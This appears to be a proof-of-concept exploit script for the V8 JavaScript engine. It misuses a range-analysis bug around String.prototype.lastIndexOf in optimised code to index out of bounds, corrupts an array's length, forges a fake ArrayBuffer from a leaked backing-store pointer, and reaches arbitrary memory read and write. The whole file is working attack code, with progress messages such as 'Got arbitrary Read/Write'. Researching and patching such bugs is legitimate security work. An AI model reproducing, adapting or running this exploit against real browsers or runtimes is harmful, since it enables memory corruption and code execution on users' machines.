let log = print;

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => {
    fv[0] = f;
      return dv[0];
}

let i2f = (i) => {
    dv[0] = BigInt(i);
      return fv[0];
}

let tagFloat = (f) => {
  fv[0] = f;
  dv[0] += 1n;
  return fv[0];
}


let hexprintablei = (i) => {
    return (i).toString(16).padStart(16,"0");
}

let assert = (l,r,m) => {
  if (l != r) {
    log(hexprintablei(l) + " != " +  hexprintablei(r));
    log(m);
    throw "failed assert";
  }
  return true;
}

SUCCESS = 0;
FAILURE = 1;

FMARK = i2f(0xDEADDEAE); // lsb must be set to 0!
FTAGGEDBACKINGSTORE = i2f(0x4242);

fSIZE = i2f(0x0000020000000000);
SIZE = 0x200

AB_SIZE = 0x2000;

let PTR_SIZE = 8;

let MARK1SMI = 0x13;
let MARK2SMI = 0x37;
let MARK1 = 0x0000001300000000;
let MARK2 = 0x0000003700000000;

const str = "____"+"DOARE".repeat(214748359);

function opt_me() {
  const OOB_OFFSET = 5;
  let idx = String.prototype.lastIndexOf.call(str, ''); // JSCall | Range(-1, 1073741798)
  let val = Math.abs(Math.abs(idx) + 25); 
  val = val >> 30;
  val = val * OOB_OFFSET;
  let leak = 0;
  if (val >= OOB_OFFSET)
    leak = 0;
  else {
    let arr = new Array(1.1,1.1);
    arr2 = new Array(FMARK, FMARK);
    arr3 = new Array(MARK1SMI, Math, MARK2SMI);
    leak = arr[val];
    arr[val]Â = fSIZE;
    if (leak != 1.1 && leak != 0 && leak != undefined) {
      log("[+] Corrupted length of arr : " + arr.length);
      assert(arr.length, SIZE);
      log("[+] Got OOB R/W");
      let evil_ab = new ArrayBuffer(AB_SIZE);
      /*
      %DumpObjects(arr,50|3);
      for (let i = 0; i < 50; ++i)
        print(hexprintablei(f2i(arr[i])));
      */
      let ab_len_idx = arr.indexOf(i2f(AB_SIZE));
      assert(ab_len_idx != -1, true, "could not find array buffer");
      assert(Number(f2i(arr[ab_len_idx + 1])) & 1, false, "unexpected array buffer layout");
      assert(Number(f2i(arr[ab_len_idx + 1])) > 0x10000, true, "unexpected array buffer layout");
      assert(f2i(arr[ab_len_idx + 2]), 2, "unexpected array buffer layout");

      let ibackingstore_ptr = f2i(arr[ab_len_idx + 1]);
      let fbackingstore_ptr = arr[ab_len_idx + 1];

      // copy the array buffer so as to prepare a good looking fake array buffer
     
      let view = new BigUint64Array(evil_ab);
      for (let i = 0; i < AB_SIZE / PTR_SIZE; ++i) {
        view[i] = f2i(arr[ab_len_idx-3+i]);
      }
      
      log("[+] Found backingstore pointer : " + hexprintablei(ibackingstore_ptr));
      log("[+] Prepared fake array buffer");

      let magic_mark_idx = arr.indexOf(i2f(MARK1));
      assert(magic_mark_idx != -1, true, "could not find object pointer mark");
      assert(f2i(arr[magic_mark_idx+2]) == MARK2, true);
      arr[magic_mark_idx+1] = tagFloat(fbackingstore_ptr);

      log("[+] Got arbitrary Read/Write");
      log("[+] Writing at 0x41424344");
      view[4] = 0x41424344n;

      let rw_view = new BigUint64Array(arr3[1]);
      rw_view[0] = 0xDEADBEEFn;

      return SUCCESS;
    }
  }
  return FAILURE;
}


for (var i = 0; i < 0x10000; ++i) {
  var ret = opt_me();
  if (ret == SUCCESS)
    break;
}
